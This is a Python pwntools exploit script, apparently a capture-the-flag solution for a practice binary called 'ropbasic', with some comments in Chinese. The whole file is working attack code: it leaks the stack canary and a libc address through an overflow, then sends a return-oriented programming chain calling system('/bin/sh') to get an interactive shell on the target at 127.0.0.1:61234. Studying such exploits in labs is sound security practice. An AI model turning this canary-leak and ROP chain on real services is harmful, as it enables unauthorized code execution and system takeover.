from pwn import *
import requests

context(arch='amd64', log_level='DEBUG',terminal='/bin/zsh')
#conn = process('./ropbasic')
conn = remote("127.0.0.1", 61234)
pwnlib.gdb.attach(proc.pidof(conn)[0])
gdb.attach(conn)

#pause()
elf = ELF('./ropbasic')
libc = ELF('./libc.so.6')

# Leaking Canary
conn.recv(0x7) #0x7 bytes: b'input> '
offset = b'A'*(0x108)

# pause()
conn.send(offset + b'B')
conn.recv(0x108)
Canary = u64(conn.recv(0x8)) - 0x42
conn.recv(0x9)
log.info("Canary:{:16X}".format(Canary)) 

# Leaking libc address
__libc_start_main_offset = libc.symbols['__libc_start_main']
#pause()
conn.send(offset + b'AABBCCDDEEFFGGHH') #0x108 + 0x8 + 0x8 = 0x118
conn.recv(0x118)
received = conn.recvline() #后面一个 '\ninput> ' (printf的内容)
conn.recv(0x7)
received = received.strip(b'\n')
received = received.ljust(8, b'\0')
print(received)
# pause()
main_return_addr = u64(received)
log.info("waitwhat? " + hex(main_return_addr))

__libc_start_main_addr = main_return_addr + 0x30 
libc_addr = __libc_start_main_addr - __libc_start_main_offset
log.info("main_return_addr:      {:016X}".format(main_return_addr)) 
log.info("__libc_start_main_addr:{:016X}".format(__libc_start_main_addr)) 
log.info("libc_addr:             {:016X}".format(libc_addr)) 


# Getting system shell
ret_addr = 0x0000000000029139 + libc_addr
rdi_rtn_addr = 0x000000000002a3e5 + libc_addr
system_addr = libc.symbols['system'] + libc_addr #system函数的地址
bin_sh_addr = next(libc.search('/bin/sh')) + libc_addr #‘/bin/sh’的地址

payload = offset + p64(Canary) + b'AABBCCDD' + p64(ret_addr) + p64(rdi_rtn_addr) + p64(bin_sh_addr) + p64(system_addr) 
log.info("system_addr:{:016X}".format(system_addr)) 
log.info("bin_sh_addr:{:016X}".format(bin_sh_addr)) 

#pause()
conn.send(payload)
conn.recv(0x110)
#pause()
conn.send(payload)
conn.recv(0x110)
conn.interactive()
